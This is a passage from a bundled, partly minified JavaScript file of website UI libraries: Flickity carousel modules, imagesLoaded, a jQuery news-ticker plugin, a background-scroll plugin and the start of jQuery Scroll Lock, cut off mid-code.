        }, s.prototype.disable = function() {
            this.isEnabled && (this.element.disabled = !0, this.isEnabled = !1)
        }, s.prototype.update = function() {
            var t = this.parent.slides;
            if (this.parent.options.wrapAround && t.length > 1) return void this.enable();
            var e = t.length ? t.length - 1 : 0,
                i = this.isPrevious ? 0 : e,
                n = this.parent.selectedIndex == i ? "disable" : "enable";
            this[n]()
        }, s.prototype.destroy = function() {
            this.deactivate()
        }, n.extend(e.defaults, {
            prevNextButtons: !0,
            arrowShape: {
                x0: 10,
                x1: 60,
                y1: 50,
                x2: 70,
                y2: 40,
                x3: 30
            }
        }), e.createMethods.push("_createPrevNextButtons");
        var a = e.prototype;
        return a._createPrevNextButtons = function() {
            this.options.prevNextButtons && (this.prevButton = new s((-1), this), this.nextButton = new s(1, this), this.on("activate", this.activatePrevNextButtons))
        }, a.activatePrevNextButtons = function() {
            this.prevButton.activate(), this.nextButton.activate(), this.on("deactivate", this.deactivatePrevNextButtons)
        }, a.deactivatePrevNextButtons = function() {
            this.prevButton.deactivate(), this.nextButton.deactivate(), this.off("deactivate", this.deactivatePrevNextButtons)
        }, e.PrevNextButton = s, e
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/page-dots", ["./flickity", "tap-listener/tap-listener", "fizzy-ui-utils/utils"], function(i, n, s) {
            return e(t, i, n, s)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("./flickity"), require("tap-listener"), require("fizzy-ui-utils")) : e(t, t.Flickity, t.TapListener, t.fizzyUIUtils)
    }(window, function(t, e, i, n) {
        function s(t) {
            this.parent = t, this._create()
        }
        s.prototype = new i, s.prototype._create = function() {
            this.holder = document.createElement("ol"), this.holder.className = "flickity-page-dots", this.dots = [], this.on("tap", this.onTap), this.on("pointerDown", this.parent.childUIPointerDown.bind(this.parent))
        }, s.prototype.activate = function() {
            this.setDots(), this.bindTap(this.holder), this.parent.element.appendChild(this.holder)
        }, s.prototype.deactivate = function() {
            this.parent.element.removeChild(this.holder), i.prototype.destroy.call(this)
        }, s.prototype.setDots = function() {
            var t = this.parent.slides.length - this.dots.length;
            t > 0 ? this.addDots(t) : t < 0 && this.removeDots(-t)
        }, s.prototype.addDots = function(t) {
            for (var e = document.createDocumentFragment(), i = []; t;) {
                var n = document.createElement("li");
                n.className = "dot", e.appendChild(n), i.push(n), t--
            }
            this.holder.appendChild(e), this.dots = this.dots.concat(i)
        }, s.prototype.removeDots = function(t) {
            var e = this.dots.splice(this.dots.length - t, t);
            e.forEach(function(t) {
                this.holder.removeChild(t)
            }, this)
        }, s.prototype.updateSelected = function() {
            this.selectedDot && (this.selectedDot.className = "dot"), this.dots.length && (this.selectedDot = this.dots[this.parent.selectedIndex], this.selectedDot.className = "dot is-selected")
        }, s.prototype.onTap = function(t) {
            var e = t.target;
            if ("LI" == e.nodeName) {
                this.parent.uiChange();
                var i = this.dots.indexOf(e);
                this.parent.select(i)
            }
        }, s.prototype.destroy = function() {
            this.deactivate()
        }, e.PageDots = s, n.extend(e.defaults, {
            pageDots: !0
        }), e.createMethods.push("_createPageDots");
        var o = e.prototype;
        return o._createPageDots = function() {
            this.options.pageDots && (this.pageDots = new s(this), this.on("activate", this.activatePageDots), this.on("select", this.updateSelectedPageDots), this.on("cellChange", this.updatePageDots), this.on("resize", this.updatePageDots), this.on("deactivate", this.deactivatePageDots))
        }, o.activatePageDots = function() {
            this.pageDots.activate()
        }, o.updateSelectedPageDots = function() {
            this.pageDots.updateSelected()
        }, o.updatePageDots = function() {
            this.pageDots.setDots()
        }, o.deactivatePageDots = function() {
            this.pageDots.deactivate()
        }, e.PageDots = s, e
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/player", ["ev-emitter/ev-emitter", "fizzy-ui-utils/utils", "./flickity"], function(t, i, n) {
            return e(t, i, n)
        }) : "object" == typeof module && module.exports ? module.exports = e(require("ev-emitter"), require("fizzy-ui-utils"), require("./flickity")) : e(t.EvEmitter, t.fizzyUIUtils, t.Flickity)
    }(window, function(t, e, i) {
        function n(t) {
            this.parent = t, this.state = "stopped", o && (this.onVisibilityChange = function() {
                this.visibilityChange()
            }.bind(this), this.onVisibilityPlay = function() {
                this.visibilityPlay()
            }.bind(this))
        }
        var s, o;
        "hidden" in document ? (s = "hidden", o = "visibilitychange") : "webkitHidden" in document && (s = "webkitHidden", o = "webkitvisibilitychange"), n.prototype = Object.create(t.prototype), n.prototype.play = function() {
            if ("playing" != this.state) {
                var t = document[s];
                if (o && t) return void document.addEventListener(o, this.onVisibilityPlay);
                this.state = "playing", o && document.addEventListener(o, this.onVisibilityChange), this.tick()
            }
        }, n.prototype.tick = function() {
            if ("playing" == this.state) {
                var t = this.parent.options.autoPlay;
                t = "number" == typeof t ? t : 3e3;
                var e = this;
                this.clear(), this.timeout = setTimeout(function() {
                    e.parent.next(!0), e.tick()
                }, t)
            }
        }, n.prototype.stop = function() {
            this.state = "stopped", this.clear(), o && document.removeEventListener(o, this.onVisibilityChange)
        }, n.prototype.clear = function() {
            clearTimeout(this.timeout)
        }, n.prototype.pause = function() {
            "playing" == this.state && (this.state = "paused", this.clear())
        }, n.prototype.unpause = function() {
            "paused" == this.state && this.play()
        }, n.prototype.visibilityChange = function() {
            var t = document[s];
            this[t ? "pause" : "unpause"]()
        }, n.prototype.visibilityPlay = function() {
            this.play(), document.removeEventListener(o, this.onVisibilityPlay)
        }, e.extend(i.defaults, {
            pauseAutoPlayOnHover: !0
        }), i.createMethods.push("_createPlayer");
        var r = i.prototype;
        return r._createPlayer = function() {
            this.player = new n(this), this.on("activate", this.activatePlayer), this.on("uiChange", this.stopPlayer), this.on("pointerDown", this.stopPlayer), this.on("deactivate", this.deactivatePlayer)
        }, r.activatePlayer = function() {
            this.options.autoPlay && (this.player.play(), this.element.addEventListener("mouseenter", this))
        }, r.playPlayer = function() {
            this.player.play()
        }, r.stopPlayer = function() {
            this.player.stop()
        }, r.pausePlayer = function() {
            this.player.pause()
        }, r.unpausePlayer = function() {
            this.player.unpause()
        }, r.deactivatePlayer = function() {
            this.player.stop(), this.element.removeEventListener("mouseenter", this)
        }, r.onmouseenter = function() {
            this.options.pauseAutoPlayOnHover && (this.player.pause(), this.element.addEventListener("mouseleave", this))
        }, r.onmouseleave = function() {
            this.player.unpause(), this.element.removeEventListener("mouseleave", this)
        }, i.Player = n, i
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/add-remove-cell", ["./flickity", "fizzy-ui-utils/utils"], function(i, n) {
            return e(t, i, n)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("./flickity"), require("fizzy-ui-utils")) : e(t, t.Flickity, t.fizzyUIUtils)
    }(window, function(t, e, i) {
        function n(t) {
            var e = document.createDocumentFragment();
            return t.forEach(function(t) {
                e.appendChild(t.element)
            }), e
        }
        var s = e.prototype;
        return s.insert = function(t, e) {
            var i = this._makeCells(t);
            if (i && i.length) {
                var s = this.cells.length;
                e = void 0 === e ? s : e;
                var o = n(i),
                    r = e == s;
                if (r) this.slider.appendChild(o);
                else {
                    var a = this.cells[e].element;
                    this.slider.insertBefore(o, a)
                }
                if (0 === e) this.cells = i.concat(this.cells);
                else if (r) this.cells = this.cells.concat(i);
                else {
                    var h = this.cells.splice(e, s - e);
                    this.cells = this.cells.concat(i).concat(h)
                }
                this._sizeCells(i);
                var l = e > this.selectedIndex ? 0 : i.length;
                this._cellAddedRemoved(e, l)
            }
        }, s.append = function(t) {
            this.insert(t, this.cells.length)
        }, s.prepend = function(t) {
            this.insert(t, 0)
        }, s.remove = function(t) {
            var e, n, s = this.getCells(t),
                o = 0,
                r = s.length;
            for (e = 0; e < r; e++) {
                n = s[e];
                var a = this.cells.indexOf(n) < this.selectedIndex;
                o -= a ? 1 : 0
            }
            for (e = 0; e < r; e++) n = s[e], n.remove(), i.removeFrom(this.cells, n);
            s.length && this._cellAddedRemoved(0, o)
        }, s._cellAddedRemoved = function(t, e) {
            e = e || 0, this.selectedIndex += e, this.selectedIndex = Math.max(0, Math.min(this.slides.length - 1, this.selectedIndex)), this.cellChange(t, !0), this.emitEvent("cellAddedRemoved", [t, e])
        }, s.cellSizeChange = function(t) {
            var e = this.getCell(t);
            if (e) {
                e.getSize();
                var i = this.cells.indexOf(e);
                this.cellChange(i)
            }
        }, s.cellChange = function(t, e) {
            var i = this.slideableWidth;
            if (this._positionCells(t), this._getWrapShiftCells(), this.setGallerySize(), this.emitEvent("cellChange", [t]), this.options.freeScroll) {
                var n = i - this.slideableWidth;
                this.x += n * this.cellAlign, this.positionSlider()
            } else e && this.positionSliderAtSelected(), this.select(this.selectedIndex)
        }, e
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/lazyload", ["./flickity", "fizzy-ui-utils/utils"], function(i, n) {
            return e(t, i, n)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("./flickity"), require("fizzy-ui-utils")) : e(t, t.Flickity, t.fizzyUIUtils)
    }(window, function(t, e, i) {
        "use strict";

        function n(t) {
            if ("IMG" == t.nodeName && t.getAttribute("data-flickity-lazyload")) return [t];
            var e = t.querySelectorAll("img[data-flickity-lazyload]");
            return i.makeArray(e)
        }

        function s(t, e) {
            this.img = t, this.flickity = e, this.load()
        }
        e.createMethods.push("_createLazyload");
        var o = e.prototype;
        return o._createLazyload = function() {
            this.on("select", this.lazyLoad)
        }, o.lazyLoad = function() {
            var t = this.options.lazyLoad;
            if (t) {
                var e = "number" == typeof t ? t : 0,
                    i = this.getAdjacentCellElements(e),
                    o = [];
                i.forEach(function(t) {
                    var e = n(t);
                    o = o.concat(e)
                }), o.forEach(function(t) {
                    new s(t, this)
                }, this)
            }
        }, s.prototype.handleEvent = i.handleEvent, s.prototype.load = function() {
            this.img.addEventListener("load", this), this.img.addEventListener("error", this), this.img.src = this.img.getAttribute("data-flickity-lazyload"), this.img.removeAttribute("data-flickity-lazyload")
        }, s.prototype.onload = function(t) {
            this.complete(t, "flickity-lazyloaded")
        }, s.prototype.onerror = function(t) {
            this.complete(t, "flickity-lazyerror")
        }, s.prototype.complete = function(t, e) {
            this.img.removeEventListener("load", this), this.img.removeEventListener("error", this);
            var i = this.flickity.getParentCell(this.img),
                n = i && i.element;
            this.flickity.cellSizeChange(n), this.img.classList.add(e), this.flickity.dispatchEvent("lazyLoad", t, n)
        }, e.LazyLoader = s, e
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/index", ["./flickity", "./drag", "./prev-next-button", "./page-dots", "./player", "./add-remove-cell", "./lazyload"], e) : "object" == typeof module && module.exports && (module.exports = e(require("./flickity"), require("./drag"), require("./prev-next-button"), require("./page-dots"), require("./player"), require("./add-remove-cell"), require("./lazyload")))
    }(window, function(t) {
        return t
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity-as-nav-for/as-nav-for", ["flickity/js/index", "fizzy-ui-utils/utils"], e) : "object" == typeof module && module.exports ? module.exports = e(require("flickity"), require("fizzy-ui-utils")) : t.Flickity = e(t.Flickity, t.fizzyUIUtils)
    }(window, function(t, e) {
        function i(t, e, i) {
            return (e - t) * i + t
        }
        t.createMethods.push("_createAsNavFor");
        var n = t.prototype;
        return n._createAsNavFor = function() {
            this.on("activate", this.activateAsNavFor), this.on("deactivate", this.deactivateAsNavFor), this.on("destroy", this.destroyAsNavFor);
            var t = this.options.asNavFor;
            if (t) {
                var e = this;
                setTimeout(function() {
                    e.setNavCompanion(t)
                })
            }
        }, n.setNavCompanion = function(i) {
            i = e.getQueryElement(i);
            var n = t.data(i);
            if (n && n != this) {
                this.navCompanion = n;
                var s = this;
                this.onNavCompanionSelect = function() {
                    s.navCompanionSelect()
                }, n.on("select", this.onNavCompanionSelect), this.on("staticClick", this.onNavStaticClick), this.navCompanionSelect(!0)
            }
        }, n.navCompanionSelect = function(t) {
            if (this.navCompanion) {
                var e = this.navCompanion.selectedCells[0],
                    n = this.navCompanion.cells.indexOf(e),
                    s = n + this.navCompanion.selectedCells.length - 1,
                    o = Math.floor(i(n, s, this.navCompanion.cellAlign));
                if (this.selectCell(o, !1, t), this.removeNavSelectedElements(), !(o >= this.cells.length)) {
                    var r = this.cells.slice(n, s + 1);
                    this.navSelectedElements = r.map(function(t) {
                        return t.element
                    }), this.changeNavSelectedClass("add")
                }
            }
        }, n.changeNavSelectedClass = function(t) {
            this.navSelectedElements.forEach(function(e) {
                e.classList[t]("is-nav-selected")
            })
        }, n.activateAsNavFor = function() {
            this.navCompanionSelect(!0)
        }, n.removeNavSelectedElements = function() {
            this.navSelectedElements && (this.changeNavSelectedClass("remove"), delete this.navSelectedElements)
        }, n.onNavStaticClick = function(t, e, i, n) {
            "number" == typeof n && this.navCompanion.selectCell(n)
        }, n.deactivateAsNavFor = function() {
            this.removeNavSelectedElements()
        }, n.destroyAsNavFor = function() {
            this.navCompanion && (this.navCompanion.off("select", this.onNavCompanionSelect), this.off("staticClick", this.onNavStaticClick), delete this.navCompanion)
        }, t
    }),
    function(t, e) {
        "use strict";
        "function" == typeof define && define.amd ? define("imagesloaded/imagesloaded", ["ev-emitter/ev-emitter"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("ev-emitter")) : t.imagesLoaded = e(t, t.EvEmitter)
    }("undefined" != typeof window ? window : this, function(t, e) {
        function i(t, e) {
            for (var i in e) t[i] = e[i];
            return t
        }

        function n(t) {
            var e = [];
            if (Array.isArray(t)) e = t;
            else if ("number" == typeof t.length)
                for (var i = 0; i < t.length; i++) e.push(t[i]);
            else e.push(t);
            return e
        }

        function s(t, e, o) {
            return this instanceof s ? ("string" == typeof t && (t = document.querySelectorAll(t)), this.elements = n(t), this.options = i({}, this.options), "function" == typeof e ? o = e : i(this.options, e), o && this.on("always", o), this.getImages(), a && (this.jqDeferred = new a.Deferred), void setTimeout(function() {
                this.check()
            }.bind(this))) : new s(t, e, o)
        }

        function o(t) {
            this.img = t
        }

        function r(t, e) {
            this.url = t, this.element = e, this.img = new Image
        }
        var a = t.jQuery,
            h = t.console;
        s.prototype = Object.create(e.prototype), s.prototype.options = {}, s.prototype.getImages = function() {
            this.images = [], this.elements.forEach(this.addElementImages, this)
        }, s.prototype.addElementImages = function(t) {
            "IMG" == t.nodeName && this.addImage(t), this.options.background === !0 && this.addElementBackgroundImages(t);
            var e = t.nodeType;
            if (e && l[e]) {
                for (var i = t.querySelectorAll("img"), n = 0; n < i.length; n++) {
                    var s = i[n];
                    this.addImage(s)
                }
                if ("string" == typeof this.options.background) {
                    var o = t.querySelectorAll(this.options.background);
                    for (n = 0; n < o.length; n++) {
                        var r = o[n];
                        this.addElementBackgroundImages(r)
                    }
                }
            }
        };
        var l = {
            1: !0,
            9: !0,
            11: !0
        };
        return s.prototype.addElementBackgroundImages = function(t) {
            var e = getComputedStyle(t);
            if (e)
                for (var i = /url\((['"])?(.*?)\1\)/gi, n = i.exec(e.backgroundImage); null !== n;) {
                    var s = n && n[2];
                    s && this.addBackground(s, t), n = i.exec(e.backgroundImage)
                }
        }, s.prototype.addImage = function(t) {
            var e = new o(t);
            this.images.push(e)
        }, s.prototype.addBackground = function(t, e) {
            var i = new r(t, e);
            this.images.push(i)
        }, s.prototype.check = function() {
            function t(t, i, n) {
                setTimeout(function() {
                    e.progress(t, i, n)
                })
            }
            var e = this;
            return this.progressedCount = 0, this.hasAnyBroken = !1, this.images.length ? void this.images.forEach(function(e) {
                e.once("progress", t), e.check()
            }) : void this.complete()
        }, s.prototype.progress = function(t, e, i) {
            this.progressedCount++, this.hasAnyBroken = this.hasAnyBroken || !t.isLoaded, this.emitEvent("progress", [this, t, e]), this.jqDeferred && this.jqDeferred.notify && this.jqDeferred.notify(this, t), this.progressedCount == this.images.length && this.complete(), this.options.debug && h && h.log("progress: " + i, t, e)
        }, s.prototype.complete = function() {
            var t = this.hasAnyBroken ? "fail" : "done";
            if (this.isComplete = !0, this.emitEvent(t, [this]), this.emitEvent("always", [this]), this.jqDeferred) {
                var e = this.hasAnyBroken ? "reject" : "resolve";
                this.jqDeferred[e](this)
            }
        }, o.prototype = Object.create(e.prototype), o.prototype.check = function() {
            var t = this.getIsImageComplete();
            return t ? void this.confirm(0 !== this.img.naturalWidth, "naturalWidth") : (this.proxyImage = new Image, this.proxyImage.addEventListener("load", this), this.proxyImage.addEventListener("error", this), this.img.addEventListener("load", this), this.img.addEventListener("error", this), void(this.proxyImage.src = this.img.src))
        }, o.prototype.getIsImageComplete = function() {
            return this.img.complete && void 0 !== this.img.naturalWidth
        }, o.prototype.confirm = function(t, e) {
            this.isLoaded = t, this.emitEvent("progress", [this, this.img, e])
        }, o.prototype.handleEvent = function(t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }, o.prototype.onload = function() {
            this.confirm(!0, "onload"), this.unbindEvents()
        }, o.prototype.onerror = function() {
            this.confirm(!1, "onerror"), this.unbindEvents()
        }, o.prototype.unbindEvents = function() {
            this.proxyImage.removeEventListener("load", this), this.proxyImage.removeEventListener("error", this), this.img.removeEventListener("load", this), this.img.removeEventListener("error", this)
        }, r.prototype = Object.create(o.prototype), r.prototype.check = function() {
            this.img.addEventListener("load", this), this.img.addEventListener("error", this), this.img.src = this.url;
            var t = this.getIsImageComplete();
            t && (this.confirm(0 !== this.img.naturalWidth, "naturalWidth"), this.unbindEvents())
        }, r.prototype.unbindEvents = function() {
            this.img.removeEventListener("load", this), this.img.removeEventListener("error", this)
        }, r.prototype.confirm = function(t, e) {
            this.isLoaded = t, this.emitEvent("progress", [this, this.element, e])
        }, s.makeJQueryPlugin = function(e) {
            e = e || t.jQuery, e && (a = e, a.fn.imagesLoaded = function(t, e) {
                var i = new s(this, t, e);
                return i.jqDeferred.promise(a(this))
            })
        }, s.makeJQueryPlugin(), s
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define(["flickity/js/index", "imagesloaded/imagesloaded"], function(i, n) {
            return e(t, i, n)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("flickity"), require("imagesloaded")) : t.Flickity = e(t, t.Flickity, t.imagesLoaded)
    }(window, function(t, e, i) {
        "use strict";
        e.createMethods.push("_createImagesLoaded");
        var n = e.prototype;
        return n._createImagesLoaded = function() {
            this.on("activate", this.imagesLoaded)
        }, n.imagesLoaded = function() {
            function t(t, i) {
                var n = e.getParentCell(i.img);
                e.cellSizeChange(n && n.element), e.options.freeScroll || e.positionSliderAtSelected()
            }
            if (this.options.imagesLoaded) {
                var e = this;
                i(this.slider).on("progress", t)
            }
        }, e
    });

/*
 * jQuery Bootstrap News Box v1.0.1
 *
 * Copyright 2014, Dragan Mitrovic
 * email: gagi270683@gmail.com
 * Free to use and abuse under the MIT license.
 * http://www.opensource.org/licenses/mit-license.php
 */
if (typeof Object.create !== "function") {
    Object.create = function(e) {
        function t() {}
        t.prototype = e;
        return new t
    }
}(function(e, t, n, r) {
    var i = {
        init: function(t, n) {
            var r = this;
            r.elem = n;
            r.$elem = e(n);
            r.newsTagName = r.$elem.find(":first-child").prop("tagName");
            r.newsClassName = r.$elem.find(":first-child").attr("class");
            r.timer = null;
            r.resizeTimer = null;
            r.animationStarted = false;
            r.isHovered = false;
            if (typeof t === "string") {
                if (console) {
                    console.error("String property override is not supported")
                }
                throw "String property override is not supported"
            } else {
                r.options = e.extend({}, e.fn.bootstrapNews.options, t);
                r.prepareLayout();
                if (r.options.autoplay) {
                    r.animate()
                }
                if (r.options.navigation) {
                    r.buildNavigation()
                }
                if (typeof r.options.onToDo === "function") {
                    r.options.onToDo.apply(r, arguments)
                }
            }
        },
        prepareLayout: function() {
            var n = this;
            e(n.elem).find("." + n.newsClassName).on("mouseenter", function() {
                n.onReset(true)
            });
            e(n.elem).find("." + n.newsClassName).on("mouseout", function() {
                n.onReset(false)
            });
            e.map(n.$elem.find(n.newsTagName), function(t, r) {
                if (r > n.options.newsPerPage - 1) {
                    e(t).hide()
                } else {
                    e(t).show()
                }
            });
            if (n.$elem.find(n.newsTagName).length < n.options.newsPerPage) {
                n.options.newsPerPage = n.$elem.find(n.newsTagName).length
            }
            var r = 0;
            e.map(n.$elem.find(n.newsTagName), function(t, i) {
                if (i < n.options.newsPerPage) {
                    r = parseInt(r) + parseInt(e(t).height()) + 10
                }
            });
            e(n.elem).css({
                "overflow-y": "hidden",
                height: r
            });
            e(t).resize(function() {
                if (n.resizeTimer !== null) {
                    clearTimeout(n.resizeTimer)
                }
                n.resizeTimer = setTimeout(function() {
                    n.prepareLayout()
                }, 200)
            })
        },
        findPanelObject: function() {
            var e = this.$elem;
            while (e.parent() !== r) {
                e = e.parent();
                if (e.parent().hasClass("panel")) {
                    return e.parent()
                }
            }
            return r
        },
        buildNavigation: function() {
            var t = this.findPanelObject();
            if (t) {
                var n = '<ul>' + '<li><a href="#" class="prev generic-button"><span class="oic-down-open"></span></a></li>' + '<li><a href="#" class="next generic-button"><span class="oic-up-open"></span></a></li>' + '</ul><div class="clearfix"></div>';
                var r = e(t).find(".panel-footer")[0];
                if (r) {
                    e(r).append(n)
                } else {
                    e(t).append('<div class="panel-footer">' + n + "</div>")
                }
                var i = this;
                e(t).find(".prev").on("click", function(e) {
                    e.preventDefault();
                    i.onPrev()
                });
                e(t).find(".next").on("click", function(e) {
                    e.preventDefault();
                    i.onNext()
                })
            }
        },
        onStop: function() {},
        onPause: function() {
            var e = this;
            e.isHovered = true;
            if (this.options.autoplay && e.timer) {
                clearTimeout(e.timer)
            }
        },
        onReset: function(e) {
            var t = this;
            if (t.timer) {
                clearTimeout(t.timer)
            }
            if (t.options.autoplay) {
                t.isHovered = e;
                t.animate()
            }
        },
        animate: function() {
            var e = this;
            e.timer = setTimeout(function() {
                if (!e.options.pauseOnHover) {
                    e.isHovered = false
                }
                if (!e.isHovered) {
                    if (e.options.direction === "up") {
                        e.onNext()
                    } else {
                        e.onPrev()
                    }
                }
            }, e.options.newsTickerInterval)
        },
        onPrev: function() {
            var t = this;
            if (t.animationStarted) {
                return false
            }
            t.animationStarted = true;
            var n = "<" + t.newsTagName + ' style="display:none;" class="' + t.newsClassName + '">' + e(t.$elem).find(t.newsTagName).last().html() + "</" + t.newsTagName + ">";
            e(t.$elem).prepend(n);
            e(t.$elem).find(t.newsTagName).first().slideDown(t.options.animationSpeed, function() {
                e(t.$elem).find(t.newsTagName).last().remove()
            });
            e(t.$elem).find(t.newsTagName + ":nth-child(" + parseInt(t.options.newsPerPage + 1) + ")").slideUp(t.options.animationSpeed, function() {
                t.animationStarted = false;
                t.onReset(t.isHovered)
            });
            e(t.elem).find("." + t.newsClassName).on("mouseenter", function() {
                t.onReset(true)
            });
            e(t.elem).find("." + t.newsClassName).on("mouseout", function() {
                t.onReset(false)
            })
        },
        onNext: function() {
            var t = this;
            if (t.animationStarted) {
                return false
            }
            t.animationStarted = true;
            var n = "<" + t.newsTagName + ' style="display:none;" class=' + t.newsClassName + ">" + e(t.$elem).find(t.newsTagName).first().html() + "</" + t.newsTagName + ">";
            e(t.$elem).append(n);
            e(t.$elem).find(t.newsTagName).first().slideUp(t.options.animationSpeed, function() {
                e(this).remove()
            });
            e(t.$elem).find(t.newsTagName + ":nth-child(" + parseInt(t.options.newsPerPage + 1) + ")").slideDown(t.options.animationSpeed, function() {
                t.animationStarted = false;
                t.onReset(t.isHovered)
            });
            e(t.elem).find("." + t.newsClassName).on("mouseenter", function() {
                t.onReset(true)
            });
            e(t.elem).find("." + t.newsClassName).on("mouseout", function() {
                t.onReset(false)
            })
        }
    };
    e.fn.bootstrapNews = function(e) {
        return this.each(function() {
            var t = Object.create(i);
            t.init(e, this)
        })
    };
    e.fn.bootstrapNews.options = {
        newsPerPage: 4,
        navigation: true,
        autoplay: true,
        direction: "up",
        animationSpeed: "normal",
        newsTickerInterval: 4e3,
        pauseOnHover: true,
        onStop: null,
        onPause: null,
        onReset: null,
        onPrev: null,
        onNext: null,
        onToDo: null
    }
})(jQuery, window, document);

/**
 * Ozy Background Scroll
 */
(function($) {
    $.fn.extend({
        ozyBgScroller: function(options) {
            var defaults = {
                direction: 'h',
                current: 0,
                scrollSpeed: 90,
                step: 1
            };
            var options = $.extend(defaults, options);
            return this.each(function() {
                var o = options,
                    obj = $(this);

                function bgscroll() {
                    o.current = parseInt(o.current) + parseInt(o.step);
                    $(obj).css("backgroundPosition", (o.direction == 'h') ? o.current + "px 0" : "0 " + o.current + "px");

                }
                setInterval(bgscroll, o.scrollSpeed);
            });
        }
    });
})(jQuery);

/*!
 * Scroll Lock v3.1.3
 * https://github.com/MohammadYounes/jquery-scrollLock
 *
 * Copyright (c) 2017 Mohammad Younes
 * Licensed under GPL 3.
 */
(function(n) {
    typeof define == "function" && define.amd ? define(["jquery"], n) : n(jQuery)
})(function(n) {
    "use strict";
    var i = {
            space: 32,
            pageup: 33,
            pagedown: 34,
            end: 35,
            home: 36,
            up: 38,
            down: 40
        },
        r = function(t, i) {
            var u = i.scrollTop(),
                h = i.prop("scrollHeight"),
                c = i.prop("clientHeight"),
                f = t.originalEvent.wheelDelta || -1 * t.originalEvent.detail || -1 * t.originalEvent.deltaY,
                r = 0,
                e, o, s;
            return t.type === "wheel" ? (e = i.height() / n(window).height(), r = t.originalEvent.deltaY * e) : this.options.touch && t.type === "touchmove" && (f = t.originalEvent.changedTouches[0].clientY - this.startClientY), s = (o = f > 0 && u + r <= 0) || f < 0 && u + r >= h - c, {
                prevent: s,
                top: o,
                scrollTop: u,
                deltaY: r
            }
        },
        u = function(n, t) {
            var u = t.scrollTop(),
                r = {
                    top: !1,
                    bottom: !1
                },
                f, e;
            return r.top = u === 0 && (n.keyCode === i.pageup || n.keyCode === i.home || n.keyCode === i.up), r.top || (f = t.prop("scrollHeight"), e = t.prop("clientHeight"), r.bottom = f === u + e && (n.keyCode === i.space || n.keyCode === i.pagedown || n.keyCode === i.end || n.keyCode === i.down)), r
        },
        t = function(i, r) {
            if (this.$element = i, this.options = n.extend({}, t.DEFAULTS, this.$element.data(), r), this.enabled = !0, this.startClientY = 0, this.options.unblock) this.$element.on(t.CORE.wheelEventName + t.NAMESPACE, this.options.unblock, n.proxy(t.CORE.unblockHandler, this));
            this.$element.on(t.CORE.wheelEventName + t.NAMESPACE, this.options.selector, n.proxy(t.CORE.handler, this));
            if (this.options.touch) {
                this.$element.on("touchstart" + t.NAMESPACE, this.options.selector, n.proxy(t.CORE.touchHandler, this));
                this.$element.on("touchmove" + t.NAMESPACE, this.options.selector, n.proxy(t.CORE.handler, this));
                if (this.options.unblock) this.$element.on("touchmove" + t.NAMESPACE, this.options.unblock, n.proxy(t.CORE.unblockHandler, this))
            }
            if (this.options.keyboard) {
                this.$element.attr("tabindex", this.options.keyboard.tabindex || 0);
                this.$element.on("keydown" + t.NAMESPACE, this.options.selector, n.proxy(t.CORE.keyboardHandler, this));
                if (this.options.unblock) this.$element.on("keydown" + t.NAMESPACE, this.options.unblock, n.proxy(t.CORE.unblockHandler, this))
            }
        },
        f;
    t.NAME = "ScrollLock";
    t.VERSION = "3.1.2";
    t.NAMESPACE = ".scrollLock";
    t.ANIMATION_NAMESPACE = t.NAMESPACE + ".effect";
    t.DEFAULTS = {
        strict: !1,
        strictFn: function(n) {
            return n.prop("scrollHeight") > n.prop("clientHeight")
        },
        selector: !1,
        animation: !1,
        touch: "ontouchstart" in window,
        keyboard: !1,
        unblock: !1
    };
    t.CORE = {
        wheelEventName: "onwheel" in document.createElement("div") ? "wheel" : document.onmousewheel !== undefined ? "mousewheel" : "DOMMouseScroll",
        animationEventName: ["webkitAnimationEnd", "mozAnimationEnd", "MSAnimationEnd", "oanimationend", "animationend"].join(t.ANIMATION_NAMESPACE + " ") + t.ANIMATION_NAMESPACE,
        unblockHandler: function(n) {
            n.__currentTarget = n.currentTarget
        },
        handler: function(i) {
            var f, u, e;
            this.enabled && !i.ctrlKey && (f = n(i.currentTarget), (this.options.strict !== !0 || this.options.strictFn(f)) && (i.stopPropagation(), u = n.proxy(r, this)(i, f), i.__currentTarget && (u.prevent &= n.proxy(r, this)(i, n(i.__currentTarget)).prevent), u.prevent && (i.preventDefault(), u.deltaY && f.scrollTop(u.scrollTop + u.deltaY), e = u.top ? "top" : "bottom", this.options.animation && setTimeout(t.CORE.animationHandler.bind(this, f, e), 0), f.trigger(n.Event(e + t.NAMESPACE)))))
        },
        touchHandler: function(n) {
            this.startClientY = n.originalEvent.touches[0].clientY
        },
        animationHandler: function(n, i) {
            var r = this.options.animation[i],
                u = this.options.animation.top + " " + this.options.animation.bottom;
            n.off(t.ANIMATION_NAMESPACE).removeClass(u).addClass(r).one(t.CORE.animationEventName, function() {
                n.removeClass(r)
            })
        },
        keyboardHandler: function(i) {
            var r = n(i.currentTarget),
                o = r.scrollTop(),
                f = u(i, r),
                e;
            return (i.__currentTarget && (e = u(i, n(i.__currentTarget)), f.top &= e.top, f.bottom &= e.bottom), f.top) ? (r.trigger(n.Event("top" + t.NAMESPACE)), this.options.animation && setTimeout(t.CORE.animationHandler.bind(this, r, "top"), 0), !1) : f.bottom ? (r.trigger(n.Event("bottom" + t.NAMESPACE)), this.options.animation && setTimeout(t.CORE.animationHandler.bind(this, r, "bottom"), 0), !1) : void 0
        }
    };
    t.prototype.toggleStrict = function() {
        this.options.strict = !this.options.strict
    };
    t.prototype.enable = function() {
        this.enabled = !0
    };
    t.prototype.disable = function() {
        this.enabled = !1
    };
    t.prototype.destroy = function() {
        this.disable();
        this.$element.off(t.NAMESPACE);
        this.$element = null;
        this.options = null
    };
    f = n.fn.scrollLock;
    n.fn.scrollLock = function(i) {
        return this.each(function() {
            var u = n(this),
                f = typeof i == "object" && i,
                r = u.data(t.NAME);
            (r || "destroy" !== i) && (r || u.data(t.NAME, r = new t(u, f)), typeof i == "string" && r[i]())
        })
    };
